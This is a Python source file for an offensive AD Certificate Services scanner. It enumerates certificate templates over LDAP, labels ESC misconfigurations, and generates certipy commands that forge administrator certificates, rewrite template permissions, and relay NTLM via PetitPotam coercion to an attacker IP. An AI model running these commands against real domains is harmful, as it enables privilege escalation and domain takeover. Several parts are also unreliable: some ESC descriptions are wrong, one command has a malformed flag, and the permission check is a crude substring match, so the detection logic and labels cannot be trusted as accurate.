"""AD Certificate Services (AD CS) Vulnerability Scanner

Scans Active Directory for misconfigured certificate templates (ESC1-ESC11)
and generates ready-to-run certipy exploitation commands.

References:
- https://github.com/ly4k/Certipy
- https://www.thehacker.recipes/ad/movement/ad-certificates
- https://posts.specterops.io/certified-pre-owned-d95910965cd2
"""

from __future__ import annotations
import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional, Dict, Any, Set
from pathlib import Path

try:
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, MODIFY_REPLACE
    from ldap3.protocol.formatters.formatters import format_sid
    LDAP3_AVAILABLE = True
except ImportError:
    Server = Connection = ALL = NTLM = SUBTREE = MODIFY_REPLACE = None
    format_sid = None
    LDAP3_AVAILABLE = False

logger = logging.getLogger(__name__)


class ESCType(str, Enum):
    """Active Directory Certificate Services vulnerability types."""
    ESC1 = "ESC1"              # Vulnerable template: Enroll + Client Auth + Supply Subject
    ESC2 = "ESC2"              # Vulnerable template: Enroll + Any Purpose / No EKU
    ESC3 = "ESC3"              # Certificate Request Agent enroll on behalf of
    ESC4 = "ESC4"              # Dangerous template permissions (WriteDacl, WriteOwner, etc.)
    ESC5 = "ESC5"              # Vulnerable CA permissions (ManageCA, ManageCertificates)
    ESC6 = "ESC6"              # EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
    ESC7 = "ESC7"              # Vulnerable certificate template (PetitPotam/NTLM relay)
    ESC8 = "ESC8"              # NTLM Relay to AD CS HTTP endpoints
    ESC9 = "ESC9"              # No Security Extension + Enroll + Client Auth
    ESC10 = "ESC10"            # Domain Controller certificate template abuse
    ESC11 = "ESC11"            # Golden Certificates (CA private key theft)
    UNKNOWN = "UNKNOWN"


@dataclass
class ADCSVuln:
    """Represents an AD CS vulnerability finding."""
    template_name: str
    esc_type: ESCType
    vulnerable_perms: List[str] = field(default_factory=list)
    exploit_command: str = ""
    details: Dict[str, Any] = field(default_factory=dict)
    severity: str = "HIGH"  # CRITICAL, HIGH, MEDIUM, LOW
    cvss: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "template_name": self.template_name,
            "esc_type": self.esc_type.value,
            "vulnerable_perms": self.vulnerable_perms,
            "exploit_command": self.exploit_command,
            "details": self.details,
            "severity": self.severity,
            "cvss": self.cvss,
        }


@dataclass
class ADCSScanResult:
    """Complete scan results."""
    domain: str
    dc_ip: str
    username: str
    vulnerable_templates: List[ADCSVuln] = field(default_factory=list)
    ca_info: Dict[str, Any] = field(default_factory=dict)
    scan_errors: List[str] = field(default_factory=list)
    total_templates_scanned: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "domain": self.domain,
            "dc_ip": self.dc_ip,
            "username": self.username,
            "vulnerable_templates": [v.to_dict() for v in self.vulnerable_templates],
            "ca_info": self.ca_info,
            "scan_errors": self.scan_errors,
            "total_templates_scanned": self.total_templates_scanned,
        }


class ADCSScanner:
    """Scanner for AD CS vulnerabilities (ESC1-ESC11)."""

    # Certificate Template OIDs
    EKU_CLIENT_AUTH = "1.3.6.1.5.5.7.3.2"
    EKU_SMARTCARD_LOGON = "1.3.6.1.4.1.311.20.2.2"
    EKU_ANY_PURPOSE = "2.5.29.37.0"
    EKU_ENROLLMENT_AGENT = "1.3.6.1.4.1.311.20.2.1"
    
    # Template schema attributes
    TEMPLATE_ATTRS = [
        "cn", "displayName", "name", "distinguishedName",
        "msPKI-Certificate-Name-Flag",
        "msPKI-Enrollment-Flag",
        "msPKI-Private-Key-Flag",
        "msPKI-Certificate-Application-Policy",
        "msPKI-Certificate-Policy",
        "msPKI-RA-Application-Policies",
        "msPKI-RA-Signature",
        "pKIExtendedKeyUsage",
        "pKIDefaultKeySpec",
        "msPKI-Minimal-Key-Size",
        "revision",
        "msPKI-Template-Schema-Version",
        "msPKI-Template-Minor-Revision",
        "nTSecurityDescriptor",
    ]

    # Dangerous permissions for ESC4
    DANGEROUS_PERMS = {
        "WriteDacl",
        "WriteOwner",
        "WriteProperty",
        "AllExtendedRights",
        "ControlAccess",
        "GenericAll",
        "GenericWrite",
    }

    def __init__(self, config_path: Optional[str] = None):
        self.config = {}
        if config_path:
            import yaml
            with open(config_path) as f:
                self.config = yaml.safe_load(f) or {}
        
        scanner_config = self.config.get("scanners", {}).get("adcs", {})
        self.ldap_timeout = scanner_config.get("ldap_timeout", 30)
        self.page_size = scanner_config.get("page_size", 1000)
        
        self._conn: Optional[Connection] = None
        self._domain_dn: str = ""
        self._config_dn: str = ""
        self._schema_dn: str = ""

    def _connect(self, dc_ip: str, username: str, password: str, domain: str) -> bool:
        """Establish LDAP connection to domain controller."""
        if not LDAP3_AVAILABLE:
            self._add_error("ldap3 not installed. Install with: pip install ldap3")
            return False

        try:
            # Try to parse domain DN from username if it's UPN format
            if "@" in username:
                user_part, domain_part = username.split("@", 1)
                domain = domain_part
                username = user_part
            
            # Build domain DN
            domain_parts = domain.split(".")
            self._domain_dn = ",".join(f"DC={part}" for part in domain_parts)
            self._config_dn = f"CN=Configuration,{self._domain_dn}"
            self._schema_dn = f"CN=Schema,{self._config_dn}"

            server = Server(dc_ip, get_info=ALL, connect_timeout=self.ldap_timeout)  # type: ignore
            self._conn = Connection(  # type: ignore
                server,
                user=f"{username}@{domain}",
                password=password,
                authentication=NTLM,
                auto_bind=True,
                receive_timeout=self.ldap_timeout,
            )
            
            logger.info(f"Connected to {dc_ip} as {username}@{domain}")
            return True
            
        except Exception as e:
            self._add_error(f"LDAP connection failed: {e}")
            return False

    def _add_error(self, msg: str):
        logger.error(msg)
        if not hasattr(self, '_errors'):
            self._errors = []
        self._errors.append(msg)

    def scan(
        self,
        dc_ip: str,
        username: str,
        password: str,
        domain: str
    ) -> ADCSScanResult:
        """Main scan entry point."""
        result = ADCSScanResult(
            domain=domain,
            dc_ip=dc_ip,
            username=username,
        )
        self._errors = []

        if not self._connect(dc_ip, username, password, domain):
            result.scan_errors = self._errors
            return result

        try:
            # 1. Enumerate Certificate Templates
            templates = self._enumerate_templates()
            result.total_templates_scanned = len(templates)
            
            # 2. Analyze each template for ESC1-ESC11
            for template in templates:
                vulns = self._analyze_template(template)
                result.vulnerable_templates.extend(vulns)
            
            # 3. Check CA configuration (ESC5, ESC6)
            ca_vulns = self._check_ca_config()
            result.vulnerable_templates.extend(ca_vulns)
            result.ca_info = self._get_ca_info()
            
            # 4. Check for ESC8 (NTLM Relay to AD CS)
            if self._check_web_enrollment():
                result.vulnerable_templates.append(ADCSVuln(
                    template_name="AD CS Web Enrollment",
                    esc_type=ESCType.ESC8,
                    vulnerable_perms=["HTTP NTLM Relay"],
                    exploit_command=self._gen_esc8_command(dc_ip, domain),
                    severity="CRITICAL",
                    cvss=9.0,
                    details={"vector": "NTLM Relay to /certsrv/certfnsh.asp or /certsrv/certccli.asp"}
                ))
            
        except Exception as e:
            self._add_error(f"Scan error: {e}")
        finally:
            if self._conn:
                self._conn.unbind()
        
        result.scan_errors = self._errors
        return result

    def _enumerate_templates(self) -> List[Dict]:
        """Enumerate all certificate templates in AD."""
        templates = []
        
        if not self._conn:
            return templates
        
        # Certificate Templates container
        templates_dn = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{self._config_dn}"
        
        self._conn.search(
            search_base=templates_dn,
            search_filter="(objectClass=pKICertificateTemplate)",
            search_scope=SUBTREE,
            attributes=self.TEMPLATE_ATTRS,
            paged_size=self.page_size,
        )
        
        for entry in self._conn.entries:
            template = {}
            for attr in self.TEMPLATE_ATTRS:
                if hasattr(entry, attr) and entry[attr].value:
                    template[attr.lower()] = entry[attr].value
            templates.append(template)
        
        logger.info(f"Found {len(templates)} certificate templates")
        return templates

    def _analyze_template(self, template: Dict) -> List[ADCSVuln]:
        """Analyze a single template for ESC1-ESC11 vulnerabilities."""
        vulns = []
        template_name = template.get("cn") or template.get("name", "Unknown")
        
        # Parse template flags
        cert_name_flag = int(template.get("mspki-certificate-name-flag", 0))
        enrollment_flag = int(template.get("mspki-enrollment-flag", 0))
        private_key_flag = int(template.get("mspki-private-key-flag", 0))
        
        # Get EKUs
        ekus = template.get("pkiextendedkeyusage", [])
        if isinstance(ekus, str):
            ekus = [ekus]
        
        has_client_auth = self.EKU_CLIENT_AUTH in ekus
        has_smartcard_logon = self.EKU_SMARTCARD_LOGON in ekus
        has_any_purpose = self.EKU_ANY_PURPOSE in ekus
        has_enrollment_agent = self.EKU_ENROLLMENT_AGENT in ekus
        
        # Check if subject can be supplied in request (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1)
        enrollee_supplies_subject = bool(cert_name_flag & 0x1)
        
        # Check if template requires manager approval (CT_FLAG_PEND_ALL_REQUESTS = 0x2)
        requires_approval = bool(enrollment_flag & 0x2)
        
        # Check if template publishes to DS (CT_FLAG_PUBLISH_TO_DS = 0x4)
        publishes_to_ds = bool(enrollment_flag & 0x4)
        
        # --- ESC1: Enroll + Client Auth + Enrollee Supplies Subject ---
        if (enrollee_supplies_subject and has_client_auth and not requires_approval):
            vulns.append(ADCSVuln(
                template_name=template_name,
                esc_type=ESCType.ESC1,
                vulnerable_perms=["Enroll", "Client Authentication", "Supply Subject"],
                exploit_command=self._gen_esc1_command(template_name),
                severity="CRITICAL",
                cvss=9.8,
                details={
                    "cert_name_flag": cert_name_flag,
                    "enrollment_flag": enrollment_flag,
                    "ekus": ekus,
                }
            ))
        
        # --- ESC2: Enroll + Any Purpose / No EKU ---
        if has_any_purpose or len(ekus) == 0:
            if not requires_approval:
                vulns.append(ADCSVuln(
                    template_name=template_name,
                    esc_type=ESCType.ESC2,
                    vulnerable_perms=["Enroll", "Any Purpose EKU"],
                    exploit_command=self._gen_esc2_command(template_name),
                    severity="CRITICAL",
                    cvss=9.8,
                    details={"ekus": ekus}
                ))
        
        # --- ESC3: Certificate Request Agent ---
        if has_enrollment_agent:
            vulns.append(ADCSVuln(
                template_name=template_name,
                esc_type=ESCType.ESC3,
                vulnerable_perms=["Enrollment Agent EKU"],
                exploit_command=self._gen_esc3_command(template_name),
                severity="HIGH",
                cvss=8.5,
                details={"ekus": ekus}
            ))
        
        # --- ESC4: Dangerous ACLs on template ---
        sd = template.get("ntsecuritydescriptor")
        if sd:
            dangerous_perms = self._check_template_acl(sd)
            if dangerous_perms:
                vulns.append(ADCSVuln(
                    template_name=template_name,
                    esc_type=ESCType.ESC4,
                    vulnerable_perms=dangerous_perms,
                    exploit_command=self._gen_esc4_command(template_name),
                    severity="HIGH",
                    cvss=8.0,
                    details={"dangerous_perms": dangerous_perms}
                ))
        
        # --- ESC9: No Security Extension + Enroll + Client Auth ---
        # Templates with schema version 1 (no security extension) but have Client Auth
        schema_version = int(template.get("mspki-template-schema-version", 0))
        if schema_version == 1 and has_client_auth and not requires_approval:
            vulns.append(ADCSVuln(
                template_name=template_name,
                esc_type=ESCType.ESC9,
                vulnerable_perms=["Schema v1 (No Security Extension)", "Client Authentication"],
                exploit_command=self._gen_esc1_command(template_name),  # Same exploit as ESC1
                severity="HIGH",
                cvss=8.7,
                details={"schema_version": schema_version}
            ))
        
        # --- ESC10: Domain Controller template abuse ---
        # Check for templates with Computer enrollment + Client Auth + Domain Controller EKU
        if has_client_auth and self._is_dc_template(template):
            vulns.append(ADCSVuln(
                template_name=template_name,
                esc_type=ESCType.ESC10,
                vulnerable_perms=["DC Template", "Client Authentication"],
                exploit_command=self._gen_esc10_command(template_name),
                severity="CRITICAL",
                cvss=9.5,
                details={"template_type": "Domain Controller"}
            ))
        
        return vulns

    def _check_template_acl(self, sd) -> List[str]:
        """Check template security descriptor for dangerous permissions."""
        dangerous = []
        try:
            # Parse the security descriptor using ldap3
            # This is a simplified check - in production, use impacket or full SDDL parsing
            sd_str = str(sd)
            for perm in self.DANGEROUS_PERMS:
                if perm.lower() in sd_str.lower():
                    dangerous.append(perm)
        except Exception:
            pass
        return dangerous

    def _is_dc_template(self, template: Dict) -> bool:
        """Check if template is for Domain Controllers."""
        name = (template.get("cn") or template.get("name") or "").lower()
        display = (template.get("displayname") or "").lower()
        dc_keywords = ["domain controller", "dc ", "domaincontroller"]
        return any(kw in name or kw in display for kw in dc_keywords)

    def _check_ca_config(self) -> List[ADCSVuln]:
        """Check CA configuration for ESC5 (CA permissions) and ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)."""
        vulns = []
        
        if not self._conn:
            return vulns
        
        # Find CA objects
        ca_dn = f"CN=Certification Authorities,CN=Public Key Services,CN=Services,{self._config_dn}"
        self._conn.search(
            search_base=ca_dn,
            search_filter="(objectClass=certificationAuthority)",
            search_scope=SUBTREE,
            attributes=["cn", "distinguishedName", "cACertificateDN", "flags"],
        )
        
        for entry in self._conn.entries:
            ca_name = str(entry.cn)
            ca_flags = int(entry.flags.value) if hasattr(entry, "flags") and entry.flags.value else 0
            
            # ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000
            if ca_flags & 0x00040000:
                vulns.append(ADCSVuln(
                    template_name=f"CA: {ca_name}",
                    esc_type=ESCType.ESC6,
                    vulnerable_perms=["EDITF_ATTRIBUTESUBJECTALTNAME2"],
                    exploit_command=self._gen_esc6_command(ca_name),
                    severity="CRITICAL",
                    cvss=9.8,
                    details={"ca_flags": hex(ca_flags)}
                ))
            
            # ESC5: Check CA permissions (ManageCA, ManageCertificates)
            # This requires reading the CA's security descriptor
            ca_vulns = self._check_ca_permissions(ca_name, entry.distinguishedName.value)
            vulns.extend(ca_vulns)
        
        return vulns

    def _check_ca_permissions(self, ca_name: str, ca_dn: str) -> List[ADCSVuln]:
        """Check CA object permissions for ESC5."""
        vulns = []
        if not self._conn:
            return vulns
        try:
            self._conn.search(
                search_base=ca_dn,
                search_filter="(objectClass=*)",
                search_scope=SUBTREE,
                attributes=["nTSecurityDescriptor"],
            )
            for entry in self._conn.entries:
                sd = entry.nTSecurityDescriptor.value if hasattr(entry, "nTSecurityDescriptor") else None
                if sd:
                    dangerous = self._check_template_acl(sd)
                    if dangerous:
                        vulns.append(ADCSVuln(
                            template_name=f"CA: {ca_name}",
                            esc_type=ESCType.ESC5,
                            vulnerable_perms=dangerous,
                            exploit_command=self._gen_esc5_command(ca_name),
                            severity="HIGH",
                            cvss=8.5,
                            details={"dangerous_perms": dangerous, "ca_dn": ca_dn}
                        ))
        except Exception as e:
            logger.debug(f"Could not check CA permissions for {ca_name}: {e}")
        return vulns

    def _get_ca_info(self) -> Dict:
        """Get CA information for the report."""
        info = {"cas": []}
        if not self._conn:
            return info
        ca_dn = f"CN=Certification Authorities,CN=Public Key Services,CN=Services,{self._config_dn}"
        self._conn.search(
            search_base=ca_dn,
            search_filter="(objectClass=certificationAuthority)",
            search_scope=SUBTREE,
            attributes=["cn", "cACertificateDN", "flags", "distinguishedName"],
        )
        for entry in self._conn.entries:
            info["cas"].append({
                "name": str(entry.cn),
                "cert_dn": str(entry.cACertificateDN) if hasattr(entry, "cACertificateDN") else "",
                "flags": int(entry.flags.value) if hasattr(entry, "flags") and entry.flags.value else 0,
                "dn": str(entry.distinguishedName),
            })
        return info

    def _check_web_enrollment(self) -> bool:
        """Check if AD CS Web Enrollment is enabled (ESC8 vector)."""
        if not self._conn:
            return False
        # Look for web enrollment service connection points
        # or check if certsrv web app is published
        try:
            self._conn.search(
                search_base=self._config_dn,
                search_filter="(&(objectClass=serviceConnectionPoint)(keywords=*ADCS*))",
                search_scope=SUBTREE,
                attributes=["cn", "serviceBindingInformation"],
            )
            return len(self._conn.entries) > 0
        except Exception:
            return False

    # --- Exploit Command Generators ---
    
    def _gen_esc1_command(self, template: str) -> str:
        return (
            f"certipy req -u 'user@domain' -p 'password' -dc-ip <DC_IP> "
            f"-ca '<CA_NAME>' -template '{template}' -upn 'administrator@domain' "
            f"&& certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
        )

    def _gen_esc2_command(self, template: str) -> str:
        return (
            f"certipy req -u 'user@domain' -p 'password' -dc-ip <DC_IP> "
            f"-ca '<CA_NAME>' -template '{template}' -upn 'administrator@domain' "
            f"-on behalf of 'administrator' "
            f"&& certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
        )

    def _gen_esc3_command(self, template: str) -> str:
        return (
            f"certipy req -u 'user@domain' -p 'password' -dc-ip <DC_IP> "
            f"-ca '<CA_NAME>' -template '{template}' -on-behalf-of 'administrator@domain' "
            f"&& certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
        )

    def _gen_esc4_command(self, template: str) -> str:
        return (
            f"# 1. Abuse WriteDacl/WriteOwner to modify template\n"
            f"certipy template -u 'user@domain' -p 'password' -dc-ip <DC_IP> "
            f"-template '{template}' -save-old\n"
            f"# 2. Modify to add Client Auth + Enrollee Supplies Subject\n"
            f"certipy template -u 'user@domain' -p 'password' -dc-ip <DC_IP> "
            f"-template '{template}' -enrollee-supplies-subject -client-auth\n"
            f"# 3. Exploit as ESC1\n"
            f"certipy req -u 'user@domain' -p 'password' -dc-ip <DC_IP> "
            f"-ca '<CA_NAME>' -template '{template}' -upn 'administrator@domain' "
            f"&& certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
        )

    def _gen_esc5_command(self, ca_name: str) -> str:
        return (
            f"# Abuse ManageCA/ManageCertificates on CA\n"
            f"certipy ca -u 'user@domain' -p 'password' -dc-ip <DC_IP> "
            f"-ca '{ca_name}' -enable-template 'User'\n"
            f"# Then exploit via ESC1/ESC2 on the newly enabled template"
        )

    def _gen_esc6_command(self, ca_name: str) -> str:
        return (
            f"# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 - can add SAN to any cert\n"
            f"certipy req -u 'user@domain' -p 'password' -dc-ip <DC_IP> "
            f"-ca '{ca_name}' -template 'User' -upn 'administrator@domain' "
            f"-san 'administrator@domain' "
            f"&& certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
        )

    def _gen_esc8_command(self, dc_ip: str, domain: str) -> str:
        return (
            f"# NTLM Relay to AD CS Web Enrollment\n"
            f"# 1. Start ntlmrelayx\n"
            f"ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp "
            f"-t http://<CA_HOST>/certsrv/certccli.asp "
            f"--adcs --template User\n"
            f"# 2. Coerce authentication (PetitPotam/PrinterBug)\n"
            f"petitpotam.py <ATTACKER_IP> <DC_IP>"
        )

    def _gen_esc10_command(self, template: str) -> str:
        return (
            f"# Domain Controller template abuse\n"
            f"certipy req -u 'user@domain' -p 'password' -dc-ip <DC_IP> "
            f"-ca '<CA_NAME>' -template '{template}' "
            f"-dns 'dc.domain.local' "
            f"&& certipy auth -pfx dc.pfx -dc-ip <DC_IP> -k"
        )

    # --- Convenience Methods ---
    
    def scan_and_report(
        self,
        dc_ip: str,
        username: str,
        password: str,
        domain: str,
        output_path: Optional[str] = None
    ) -> ADCSScanResult:
        """Scan and optionally save JSON report."""
        result = self.scan(dc_ip, username, password, domain)
        
        if output_path:
            import json
            with open(output_path, "w") as f:
                json.dump(result.to_dict(), f, indent=2, default=str)
            logger.info(f"Report saved to {output_path}")
        
        return result

    def generate_certipy_commands(self, result: ADCSScanResult) -> List[str]:
        """Generate all certipy commands from scan results."""
        commands = []
        for vuln in result.vulnerable_templates:
            if vuln.exploit_command:
                commands.append(f"# {vuln.esc_type.value} - {vuln.template_name}")
                commands.append(vuln.exploit_command)
                commands.append("")
        return commands


def main():
    """CLI entry point for testing."""
    import sys
    import argparse
    
    parser = argparse.ArgumentParser(description="AD CS Vulnerability Scanner")
    parser.add_argument("dc_ip", help="Domain Controller IP")
    parser.add_argument("username", help="Username (samAccountName or UPN)")
    parser.add_argument("password", help="Password")
    parser.add_argument("domain", help="Domain (FQDN)")
    parser.add_argument("-c", "--config", help="Config file path")
    parser.add_argument("-o", "--output", help="Output JSON report path")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
    
    scanner = ADCSScanner(args.config)
    result = scanner.scan_and_report(
        args.dc_ip, args.username, args.password, args.domain, args.output
    )
    
    # Print summary
    print(f"\n=== AD CS Scan Results ===")
    print(f"Domain: {result.domain}")
    print(f"DC: {result.dc_ip}")
    print(f"Templates Scanned: {result.total_templates_scanned}")
    print(f"Vulnerabilities Found: {len(result.vulnerable_templates)}")
    print()
    
    for vuln in result.vulnerable_templates:
        print(f"[{vuln.severity}] {vuln.esc_type.value} - {vuln.template_name}")
        if vuln.vulnerable_perms:
            print(f"  Permissions: {', '.join(vuln.vulnerable_perms)}")
        print()
    
    if result.scan_errors:
        print("Errors:")
        for err in result.scan_errors:
            print(f"  - {err}")
    
    # Print exploit commands
    commands = scanner.generate_certipy_commands(result)
    if commands:
        print("\n=== Certipy Exploit Commands ===")
        for cmd in commands:
            print(cmd)


if __name__ == "__main__":
    main()